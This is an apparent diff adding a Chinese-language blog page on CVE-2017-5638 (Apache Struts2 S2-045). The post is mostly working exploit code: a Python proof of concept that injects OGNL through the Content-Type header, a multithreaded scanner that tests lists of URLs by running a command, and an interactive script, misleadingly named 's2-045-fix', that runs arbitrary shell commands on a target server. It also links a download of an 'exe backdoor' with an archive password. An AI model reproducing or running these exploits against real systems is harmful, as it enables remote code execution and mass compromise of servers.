@@ -1,0 +1,672 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> CVE-2017-5638 Apache Struts2（S2-045）PoC // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              CVE-2017-5638 Apache Struts2（S2-045）PoC
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-03-09
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/03/09/s2-045/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/03/09/s2-045/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>官方公告<br><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-045</a></p>
+<p>S2-045 原理初步分析（CVE-2017-5638） - seebug<br><a href="http://paper.seebug.org/241/" target="_blank" rel="external">http://paper.seebug.org/241/</a></p>
+<h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">header = dict()</span><br><span class="line">header[<span class="string">'Content-Type'</span>] = <span class="string">"%&#123;(<span class="subst">#nike</span>='multipart/form-data').(<span class="subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="subst">#_memberAccess</span>?(<span class="subst">#_memberAccess</span>=<span class="subst">#dm</span>):((<span class="subst">#context</span>.setMemberAccess(<span class="subst">#dm</span>)))).(<span class="subst">#o</span>=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(<span class="subst">#o</span>.println('test'+602+53718)).(<span class="subst">#o</span>.close())&#125;"</span></span><br><span class="line"></span><br><span class="line">s = requests.get(sys.argv[<span class="number">1</span>], headers=header)</span><br><span class="line"><span class="built_in">print</span> s.content</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>多线程检测<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> poster.encode <span class="keyword">import</span> multipart_encode</span><br><span class="line"><span class="keyword">from</span> poster.streaminghttp <span class="keyword">import</span> register_openers</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">def poc(url):</span><br><span class="line">        register_openers()</span><br><span class="line">        datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</span><br><span class="line">        header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></span><br><span class="line">        header[<span class="string">"Content-Type"</span>]=<span class="string">"%&#123;(<span class="subst">#nike</span>='multipart/form-data').(<span class="subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="subst">#_memberAccess</span>?(<span class="subst">#_memberAccess</span>=<span class="subst">#dm</span>):((<span class="subst">#container</span>=<span class="subst">#context</span>['com.opensymphony.xwork2.ActionContext.container']).(<span class="subst">#ognlUtil</span>=<span class="subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="subst">#context</span>.setMemberAccess(<span class="subst">#dm</span>)))).(<span class="subst">#cmd</span>='echo nMask').(<span class="subst">#iswin</span>=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(<span class="subst">#cmds</span>=(<span class="subst">#iswin</span>?&#123;'cmd.exe','/c',<span class="subst">#cmd</span>&#125;:&#123;'/bin/bash','-c',<span class="subst">#cmd</span>&#125;)).(<span class="subst">#p</span>=new java.lang.ProcessBuilder(<span class="subst">#cmds</span>)).(<span class="subst">#p</span>.redirectErrorStream(true)).(<span class="subst">#process</span>=<span class="subst">#p</span>.start()).(<span class="subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="subst">#process</span>.getInputStream(),<span class="subst">#ros</span>)).(<span class="subst">#ros</span>.flush())&#125;"</span></span><br><span class="line">        try:</span><br><span class="line">            request = urllib2.Request(url,datagen,headers=header)</span><br><span class="line">            response = urllib2.urlopen(request,timeout=<span class="number">5</span>)</span><br><span class="line">            body=response.read()</span><br><span class="line">        except:</span><br><span class="line">                body=<span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"nMask"</span> <span class="keyword">in</span> body:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">"[Loopholes exist]"</span>,url</span><br><span class="line">                f.write(url+<span class="string">"\n"</span>)</span><br><span class="line">        else:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">"Loopholes not exist"</span>,url</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">        <span class="string">'''</span><br><span class="line">        url.txtÎªŽýŒì²âurlÁÐ±í</span><br><span class="line">        result.txtÎªŒì²âÍêÊä³öœá¹ûÎÄŒþ</span><br><span class="line">        '''</span></span><br><span class="line">        f=open(<span class="string">"result.txt"</span>,<span class="string">"a"</span>)</span><br><span class="line">        url_list=[i.replace(<span class="string">"\n"</span>,<span class="string">""</span>) <span class="keyword">for</span> i <span class="keyword">in</span> open(<span class="string">"url.txt"</span>,<span class="string">"r"</span>).readlines()]</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">                threading.Thread(target=poc,args=(url,)).start()</span><br><span class="line">                <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span>(len(threading.enumerate())&lt;<span class="number">50</span>):</span><br><span class="line">                                <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>s2-045-fix<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> poster.encode <span class="keyword">import</span> multipart_encode</span><br><span class="line"><span class="keyword">from</span> poster.streaminghttp <span class="keyword">import</span> register_openers</span><br><span class="line">def poc():</span><br><span class="line">    cmd = raw_input(<span class="string">'cmd &gt; '</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd != <span class="string">'exit'</span>:</span><br><span class="line">        register_openers()</span><br><span class="line">        datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</span><br><span class="line">        header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></span><br><span class="line">        header[<span class="string">"Content-Type"</span>]=<span class="string">"%&#123;(<span class="subst">#nike</span>='multipart/form-data').(<span class="subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="subst">#_memberAccess</span>?(<span class="subst">#_memberAccess</span>=<span class="subst">#dm</span>):((<span class="subst">#container</span>=<span class="subst">#context</span>['com.opensymphony.xwork2.ActionContext.container']).(<span class="subst">#ognlUtil</span>=<span class="subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="subst">#context</span>.setMemberAccess(<span class="subst">#dm</span>)))).(<span class="subst">#cmd</span>="</span>+<span class="string">"'"</span>+cmd+<span class="string">"'"</span>+<span class="string">").(<span class="subst">#iswin</span>=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(<span class="subst">#cmds</span>=(<span class="subst">#iswin</span>?&#123;'cmd.exe','/c',<span class="subst">#cmd</span>&#125;:&#123;'/bin/bash','-c',<span class="subst">#cmd</span>&#125;)).(<span class="subst">#p</span>=new java.lang.ProcessBuilder(<span class="subst">#cmds</span>)).(<span class="subst">#p</span>.redirectErrorStream(true)).(<span class="subst">#process</span>=<span class="subst">#p</span>.start()).(<span class="subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="subst">#process</span>.getInputStream(),<span class="subst">#ros</span>)).(<span class="subst">#ros</span>.flush())&#125;"</span></span><br><span class="line">        request = urllib2.Request(str(sys.argv[<span class="number">1</span>]), datagen, headers=header)</span><br><span class="line">        response = urllib2.urlopen(request)</span><br><span class="line">        <span class="built_in">print</span>(response.read())</span><br><span class="line">    else:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        poc()</span><br></pre></td></tr></table></figure></p>
+<p>exe 后门待检测</p>
+<p>链接: <a href="https://pan.baidu.com/s/1i5qktIt" target="_blank" rel="external">https://pan.baidu.com/s/1i5qktIt</a> 密码: 23v4<br>别做伸手党 给个反馈 点个赞 都可以<br>来老铁 双击666<br>解压密码 secquan.org</p>
+<h1 id="经济影响"><a href="#经济影响" class="headerlink" title="经济影响"></a>经济影响</h1><p>安恒<br>公布PoC之后立刻提供防御服务。</p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/03/09/chm-based-malware/">chm-based Malware</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/09/powershell-dns-tunnel/">无文件 powershell DNS tunnel</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/03/09/s2-045/"
+               data-title="CVE-2017-5638 Apache Struts2（S2-045）PoC" data-url="http://blkstone.github.io/2017/03/09/s2-045/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">269</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">14</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">101</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#原理分析"><span class="nav-number">1.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PoC"><span class="nav-number">2.</span> <span class="nav-text">PoC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#经济影响"><span class="nav-number">4.</span> <span class="nav-text">经济影响</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
